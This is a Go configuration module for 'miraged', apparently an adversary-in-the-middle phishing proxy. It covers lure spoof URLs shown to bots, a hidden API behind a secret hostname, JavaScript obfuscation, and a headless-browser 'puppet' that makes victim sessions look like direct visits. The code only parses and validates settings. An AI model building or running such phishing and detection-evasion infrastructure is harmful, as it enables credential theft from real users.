// Package config handles loading and validating the miraged daemon configuration.
// Config is read from a YAML file, merged with defaults, and validated.
package config

import (
	"bytes"
	"fmt"
	"net"
	"os"
	"strings"
	"time"

	"gopkg.in/yaml.v3"
)

// Default values for optional configuration fields.
const (
	DefaultHTTPSPort = 443
	DefaultDNSPort   = 53
	DefaultDataDir   = "/var/lib/mirage"
)

// Config is the top-level configuration for miraged.
type Config struct {
	Domain       string              `yaml:"domain"`
	ExternalIPv4 string              `yaml:"external_ipv4"`
	BindAddress  string              `yaml:"bind_address"` // listen address; defaults to 0.0.0.0
	HTTPSPort    int                 `yaml:"https_port"`
	DNSPort      int                 `yaml:"dns_port"`
	SpoofURL     string              `yaml:"spoof_url"` // default spoof URL served to bots/blocked visitors; can be overridden per-lure
	DataDir      string              `yaml:"data_dir"`
	SelfSigned   bool                `yaml:"self_signed"`
	DNSProviders []DNSProviderConfig `yaml:"dns_providers"`
	API          APIConfig           `yaml:"api"`
	ACME         ACMEConfig          `yaml:"acme"`
	Obfuscator   ObfuscatorConfig    `yaml:"obfuscator"`
	Puppet       PuppetConfig        `yaml:"puppet"`
}

// ACMEConfig holds settings for automatic certificate provisioning via ACME
// (Let's Encrypt). Required when not using self-signed certificates.
type ACMEConfig struct {
	Email        string `yaml:"email"`         // contact address for ACME account registration
	DirectoryURL string `yaml:"directory_url"` // ACME directory URL; defaults to Let's Encrypt production
}

// APIConfig holds settings for the management REST API.
type APIConfig struct {
	// SecretHostname is the Host header value that routes traffic to the API.
	// Requests to any other hostname go through the normal phishing pipeline.
	// If empty, the API is disabled.
	SecretHostname string `yaml:"secret_hostname"`
}

// ObfuscatorConfig holds settings for the JavaScript obfuscation sidecar.
type ObfuscatorConfig struct {
	Enabled        bool          `yaml:"enabled"`
	NodePath       string        `yaml:"node_path"`       // path to node binary; empty = search PATH
	SidecarDir     string        `yaml:"sidecar_dir"`     // dir containing package.json and index.js
	RequestTimeout time.Duration `yaml:"request_timeout"` // per-call timeout (default: 5s)
	MaxConcurrent  int           `yaml:"max_concurrent"`  // max parallel obfuscations (default: 4)
}

// PuppetConfig holds settings for the headless browser puppet service that
// collects real browser telemetry from target sites and injects overrides
// into victim responses so sessions appear indistinguishable from direct visits.
type PuppetConfig struct {
	Enabled      bool          `yaml:"enabled"`
	ChromiumPath string        `yaml:"chromium_path"` // empty = search PATH
	UserAgent    string        `yaml:"user_agent"`    // empty = default Chrome UA
	MinInstances int           `yaml:"min_instances"` // default: 1
	MaxInstances int           `yaml:"max_instances"` // default: 3
	NavTimeout   time.Duration `yaml:"nav_timeout"`   // default: 30s
	CacheTTL     time.Duration `yaml:"cache_ttl"`     // default: 1h
}

// DNSProviderConfig holds the settings for one DNS provider integration.
type DNSProviderConfig struct {
	Alias    string            `yaml:"alias"`
	Provider string            `yaml:"provider"`
	Settings map[string]string `yaml:"settings"`
}

// Load reads and parses the config file at path.
// Unknown fields in the YAML are rejected.
// Sensible defaults are applied for omitted optional fields.
func Load(path string) (*Config, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("reading config: %w", err)
	}

	var cfg Config
	dec := yaml.NewDecoder(bytes.NewReader(data))
	dec.KnownFields(true) // reject unknown fields to catch typos in config files
	if err := dec.Decode(&cfg); err != nil {
		return nil, fmt.Errorf("parsing config: %w", err)
	}

	cfg.applyDefaults()
	return &cfg, nil
}

func (c *Config) applyDefaults() {
	if c.HTTPSPort == 0 {
		c.HTTPSPort = DefaultHTTPSPort
	}
	if c.DNSPort == 0 {
		c.DNSPort = DefaultDNSPort
	}
	if c.DataDir == "" {
		c.DataDir = DefaultDataDir
	}
	if c.Puppet.MinInstances <= 0 {
		c.Puppet.MinInstances = 1
	}
	if c.Puppet.MaxInstances <= 0 {
		c.Puppet.MaxInstances = 3
	}
	if c.Puppet.NavTimeout == 0 {
		c.Puppet.NavTimeout = 30 * time.Second
	}
	if c.Puppet.CacheTTL == 0 {
		c.Puppet.CacheTTL = 1 * time.Hour
	}
	if c.Puppet.UserAgent == "" {
		c.Puppet.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
	}
}

// Validate checks all required fields and constraints, returning all errors joined
// with semicolons so the operator can fix everything in one pass.
func (c *Config) Validate() error {
	var errs []string

	if c.Domain == "" {
		errs = append(errs, "domain: required")
	}

	if c.ExternalIPv4 == "" {
		errs = append(errs, "external_ipv4: required")
	} else if net.ParseIP(c.ExternalIPv4) == nil {
		errs = append(errs, "external_ipv4: not a valid IP address")
	}

	if c.HTTPSPort < 1 || c.HTTPSPort > 65535 {
		errs = append(errs, "https_port: must be between 1 and 65535")
	}
	if c.DNSPort < 1 || c.DNSPort > 65535 {
		errs = append(errs, "dns_port: must be between 1 and 65535")
	}

	if c.API.SecretHostname == "" {
		errs = append(errs, "api.secret_hostname: required")
	}

	if !c.SelfSigned {
		if c.ACME.Email == "" {
			errs = append(errs, "acme.email: required when self_signed is false")
		}
		if c.ACME.DirectoryURL == "" {
			errs = append(errs, "acme.directory_url: required when self_signed is false"+
				" (production: https://acme-v02.api.letsencrypt.org/directory,"+
				" staging: https://acme-staging-v02.api.letsencrypt.org/directory)")
		}
	}

	for i, p := range c.DNSProviders {
		if p.Alias == "" {
			errs = append(errs, fmt.Sprintf("dns_providers[%d]: alias required", i))
		}
		if p.Provider == "" {
			errs = append(errs, fmt.Sprintf("dns_providers[%d]: provider required", i))
		}
	}

	if len(errs) > 0 {
		return fmt.Errorf("%s", strings.Join(errs, "; "))
	}
	return nil
}
